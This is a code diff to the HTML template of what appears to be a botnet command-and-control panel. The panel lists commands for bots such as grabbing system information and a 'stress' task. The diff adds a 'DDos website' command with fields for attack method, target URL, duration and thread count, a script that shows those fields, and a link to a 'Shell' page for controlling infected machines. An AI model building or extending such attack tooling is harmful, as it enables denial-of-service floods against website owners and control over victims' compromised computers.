@@ -2,7 +2,6 @@
 <html>
 <head lang="en">
     <meta charset="utf-8">
-    <script src="../static/js/site.js"></script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <title>Ace Send Commands</title>
@@ -11,11 +10,13 @@
     <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
 </head>
 <body>
+    <script src="../static/js/site.js"></script>
 
 <!-- Top Nav bar -->
 <div class="topnav">
     <a href="dashboard.html">Dashboard</a>
     <a class=active href="#sendcommands">Send Commands</a>
+    <a href="shell.html">Shell</a>
     <a href="map.html">Map</a>
     <a href="login.html">Logout</a>
 </div>
@@ -39,7 +40,6 @@
                 </div> 
             </div>
 
-            
             <br>
             <!-- Command Selection Box -->
             <div class="centerrr-box">
@@ -52,6 +52,7 @@
                         <option value="clear">Clear output</option>
                         <option value="systeminfo">Grab system information</option>
                         <option value="stress">Stress bot</option>
+                        <option value="ddos">DDos website</option>
                     </select>
 
                     <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
@@ -86,31 +87,56 @@
                         <label>Tasks</label>
                     </div> 
                 </div>
+                <!-- DDos -->
+                <div id="input-needed-ddos" style="display: none;">
+                    <div class="commands-input-group"> 
+                        <input type="text" name="ddos-method" id="ddos-method" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Method</label>
+                    </div> 
+
+                    <div class="commands-input-group"> 
+                        <input type="text" name="ddos-target" id="ddos-target" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Url</label>
+                    </div> 
+
+                    <div class="commands-input-group"> 
+                        <input type="text" name="ddos-time" id="ddos-time" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Time</label>
+                    </div> 
+
+                    <div class="commands-input-group"> 
+                        <input type="text" name="ddos-thread" id="ddos-thread" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Threads</label>
+                    </div> 
+                </div>
             </div>
 
         </form>
         <br>
-        <br>
-        <br>
         <div class="centerrr"><button type="submit" id="submit" onclick="check(this.form)" class="custom-btn btn-3"><span>Execute</span></button></div>
     </div>
-
+    
     <br><br><br><br><br>
     <!-- Command Status -->
     <div class="center-shit">{{ commandStatus }}</div><br><br>
     
-    <!-- Show commands in a list -->
+    <!-- Command Output Box -->
     <div class="place-left" id="parent">
         <div class="center-output" class="child" >
-            <!-- Command Output Box -->
-            <div class="gradient-border"> <textarea class='scroll' id="output" name="output" rows="30" cols="185" readonly>{{ commandOutput }} </textarea> </div>
+            <div class="gradient-border"> <textarea class='scroll' id="output" name="output" rows="30" cols="185" style="background-color:rgb(27, 27, 27);" readonly>{{ commandOutput }} </textarea> </div>
         </div>
     </div>
 <br>
 </form>
 
-
-    
 <!-- Footer -->
 <div class="footer"> <p>&copy; Copyright 2022, CookiesKush420</p>
 
@@ -231,7 +257,7 @@ select_optiones[indx].selected = true;
 
 </script>
 
-
+<!-- Command Input Script -->
 <script>
 function commandCheck(command) {
     /* Stress */
@@ -240,9 +266,16 @@ function commandCheck(command) {
     } else {
         document.getElementById("input-needed-stress").style.display = "none";
     }
-}
 
+    /* DDos */
+    if (command.value == "ddos") {
+        document.getElementById("input-needed-ddos").style.display = "block";
+    } else {
+        document.getElementById("input-needed-ddos").style.display = "none";
+    }
+}
 </script>
+
 
 </body>
 </html>
